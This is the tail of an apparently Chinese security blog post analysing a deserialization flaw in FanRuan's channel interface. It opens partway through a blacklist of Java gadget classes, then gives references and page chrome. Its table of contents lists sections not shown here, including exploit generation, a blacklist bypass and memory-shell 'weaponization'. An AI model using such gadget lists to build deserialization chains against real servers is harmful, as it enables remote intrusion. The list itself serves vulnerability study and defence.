class="line">org.springframework.core.SerializableTypeWrapper.$MethodInvokeTypeProvider</span><br><span class="line">org.springframework.aop.framework.AdvisedSupport</span><br><span class="line">org.springframework.aop.target.SingletonTargetSource</span><br><span class="line">org.springframework.aop.framework.JdkDynamicAopProxy</span><br><span class="line">org..springframework.transaction.jta.JtaTransactionManager</span><br><span class="line">com.fr.third.springframework.beans.factory.ObjectFactory</span><br><span class="line">com.fr.third.springframework.core.SerializableTypeWrapper.$MethodInvokeTypeProvider</span><br><span class="line">com.fr.third.springframework.aop.framework.AdvisedSupport</span><br><span class="line">com.fr.third.springframework.aop.target.SingletonTargetSource</span><br><span class="line">com.fr.third.springframework.aop.framework.JdkDynamicAopProxy</span><br><span class="line">com.fr.third.springframework.transaction.jta.JtaTransactionManager</span><br><span class="line">com.vaadin.data.util.NestedMethodProperty</span><br><span class="line">com.vaadin.data.util.PropertysetItem</span><br><span class="line">java.util.PriorityQueue</span><br><span class="line">java.lang.reflect.Proxy</span><br><span class="line">javax.management.MBeanServerInvocationHandler</span><br><span class="line">javax.management.openmbean.CompositeDataInvocationHandler</span><br><span class="line">java.beans.EventHandler</span><br><span class="line">java.util.Comparator</span><br><span class="line">org.reflections.Reflections</span><br><span class="line">com.fr.third.org.reflections.Reflections</span><br></pre></td></tr></table></figure>

<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://tttang.com/archive/1701/#toc__9" target="_blank" rel="noopener">https://tttang.com/archive/1701/#toc__9</a></p>
<p><a href="https://xz.aliyun.com/t/12509" target="_blank" rel="noopener">https://xz.aliyun.com/t/12509</a></p>
<p><a href="https://xz.aliyun.com/t/13389" target="_blank" rel="noopener">https://xz.aliyun.com/t/13389</a></p>
<p><a href="https://xz.aliyun.com/t/13900" target="_blank" rel="noopener">https://xz.aliyun.com/t/13900</a></p>

      
    </div>

    

    
      
    

    
    
    

    

    
      
    
    

    
      <div>
        




  



<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>Fany</li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    
    <a href="https://fanygit.github.io/2024/03/06/帆软channel接口反序列化漏洞分析/" title="帆软channel接口反序列化漏洞分析">https://fanygit.github.io/2024/03/06/帆软channel接口反序列化漏洞分析/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
</ul>

      </div>
    

    <footer class="post-footer">
      
        
          
        
        <div class="post-tags">
          
            <a href="/tags/java代码审计/" rel="tag"># java代码审计</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2024/02/22/致远OA低版本帆软组件RCE漏洞分析/" rel="next" title="致远OA低版本帆软组件RCE漏洞分析">
                <i class="fa fa-chevron-left"></i> 致远OA低版本帆软组件RCE漏洞分析
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2024/03/11/帆软反序列化代码执行回显/" rel="prev" title="帆软反序列化代码执行回显">
                帆软反序列化代码执行回显 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>

  </div>


          </div>
          
  
    
    <div class="comments" id="comments"></div>
  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-overview">

          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  
    <img class="site-author-image" itemprop="image" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/images/tx5.gif" alt="Fany">
  
  <p class="site-author-name" itemprop="name">Fany</p>
  <div class="site-description motion-element" itemprop="description">路虽远，行则必达。</div>
</div>


  <nav class="site-state motion-element">
    
      <div class="site-state-item site-state-posts">
        
          <a href="/archives/">
        
          <span class="site-state-item-count">114</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
    

    
      
      
      <div class="site-state-item site-state-categories">
        
          
            <a href="/categories/">
          
        
        
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
        <span class="site-state-item-count">18</span>
        <span class="site-state-item-name">分类</span>
        </a>
      </div>
    

    
      
      
      <div class="site-state-item site-state-tags">
        
          
            <a href="/tags/">
          
        
        
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
        <span class="site-state-item-count">68</span>
        <span class="site-state-item-name">标签</span>
        </a>
      </div>
    
  </nav>







  <div class="links-of-author motion-element">
    
      <span class="links-of-author-item">
      
      
        
      
      
        
      
        <a href="https://github.com/fanygit" title="GitHub &rarr; https://github.com/fanygit" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
      </span>
    
      <span class="links-of-author-item">
      
      
        
      
      
        
      
        <a href="mailto:483813121@qq.com" title="E-Mail &rarr; mailto:483813121@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
      </span>
    
  </div>



  <div class="cc-license motion-element" itemprop="license">
  
  
    
  
  
  
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>




  <div class="links-of-blogroll motion-element links-of-blogroll-block">
    <div class="links-of-blogroll-title">
      <i class="fa  fa-fw fa-link"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
      
        <li class="links-of-blogroll-item">
          <a href="https://leancloud.cn/dashboard/applist.html#/apps" title="https://leancloud.cn/dashboard/applist.html#/apps" rel="noopener" target="_blank">Leancloud</a>
        </li>
      
        <li class="links-of-blogroll-item">
          <a href="https://www.leavesongs.com/" title="https://www.leavesongs.com/" rel="noopener" target="_blank">P牛</a>
        </li>
      
        <li class="links-of-blogroll-item">
          <a href="https://drun1baby.github.io/" title="https://drun1baby.github.io/" rel="noopener" target="_blank">崖余</a>
        </li>
      
    </ul>
  </div>


          
          
        </div>
      </div>

      
      <!--noindex-->
        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
            
            
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#环境"><span class="nav-number">1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞分析"><span class="nav-number">2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用链"><span class="nav-number">3.</span> <span class="nav-text">利用链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修复方式"><span class="nav-number">4.</span> <span class="nav-text">修复方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二次反序列化绕过限制"><span class="nav-number">5.</span> <span class="nav-text">二次反序列化绕过限制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#调用链"><span class="nav-number">5.1.</span> <span class="nav-text">调用链</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#坑点"><span class="nav-number">5.2.</span> <span class="nav-text">坑点</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#add添加POJONode对象坑点"><span class="nav-number">5.2.1.</span> <span class="nav-text">add添加POJONode对象坑点</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#执行writeObject会自动触发调用"><span class="nav-number">5.2.2.</span> <span class="nav-text">执行writeObject会自动触发调用</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#生成exp"><span class="nav-number">5.3.</span> <span class="nav-text">生成exp</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#武器化：打内存马"><span class="nav-number">6.</span> <span class="nav-text">武器化：打内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#帆软-5-1-0-打冰蝎内存马"><span class="nav-number">6.1.</span> <span class="nav-text">帆软 5.1.0 打冰蝎内存马</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#帆软-5-1-18-打冰蝎内存马"><span class="nav-number">6.2.</span> <span class="nav-text">帆软 5.1.18 打冰蝎内存马</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反序列化类黑名单"><span class="nav-number">7.</span> <span class="nav-text">反序列化类黑名单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考文章"><span class="nav-number">8.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
            

          </div>
        </div>
      <!--/noindex-->
      

      

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2025</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Fany</span>

  

  
</div>


  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.2.0</div>




<!-- 网站运行时间的设置 -->
<span id="timeDate">载入天数...</span>
<span id="times">载入时分秒...</span>  Sometimes your whole life boils down to one insame move.
<script>
    var now = new Date();
    function createtime() {
        var grt= new Date("07/28/2019 00:00:00");//此处修改你的建站时间或者网站上线时间
        now.setTime(now.getTime()+250);
        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
    }
setInterval("createtime()",250);
</script>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="post-meta-item-icon">
      <i class="fa fa-user"></i>
    </span>
    <span class="site-uv" title="总访客量">
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
    </span>
  

  
    <span class="post-meta-divider">|</span>
  

  
    <span class="post-meta-item-icon">
      <i class="fa fa-eye"></i>
    </span>
    <span class="site-pv" title="总访问量">
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
    </span>
  
</div>









        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

    

    

  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>
















  
  









  
  <script src="/lib/jquery/index.js?v=3.4.1"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>




  <script src="/js/utils.js?v=7.2.0"></script>

  <script src="/js/motion.js?v=7.2.0"></script>



  
  


  <script src="/js/affix.js?v=7.2.0"></script>

  <script src="/js/schemes/pisces.js?v=7.2.0"></script>



  
  <script src="/js/scrollspy.js?v=7.2.0"></script>
<script src="/js/post-details.js?v=7.2.0"></script>



  <script src="/js/next-boot.js?v=7.2.0"></script>

  

  

  


  


  
  
    
  

  

  
  
  












  <script src="/js/local-search.js?v=7.2.0"></script>



















  
    

<script src="//unpkg.com/valine/dist/Valine.min.js"></script>

<script>
  var GUEST = ['nick', 'mail', 'link'];
  var guest = 'nick,mail,link';
  guest = guest.split(',').filter(function(item) {
    return GUEST.indexOf(item) > -1;
  });
  new Valine({
    el: '#comments',
    verify: false,
    notify: false,
    appId: 'pbe8vhO6luYrD6pclzm8NQST-gzGzoHsz',
    appKey: 'sKqLiA3nL8BojxzmOL3HCdGO',
    placeholder: '非常希望您能留下宝贵的意见！',
    avatar: 'mm',
    meta: guest,
    pageSize: '10' || 10,
    visitor: false,
    lang: '' || 'zh-cn'
  });
</script>

  
<!--   <link rel="stylesheet" href="https://github.com/fanygit/dist/raw/master/APlayer.min.css">
<div id="aplayer"></div>
<script type="text/javascript" src="https://github.com/fanygit/dist/raw/master/APlayer.min.js"></script>
<script type="text/javascript" src="https://raw.githubusercontent.com/fanygit/dist/master/music.js"></script> -->

        <style>
            [bg-lazy] {
                background-image: none !important;
                background-color: #eee !important;
            }
        </style>
        <script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z\d\-\.\+]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(t.test(e.href)||r.test(e.href))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body>
</html>
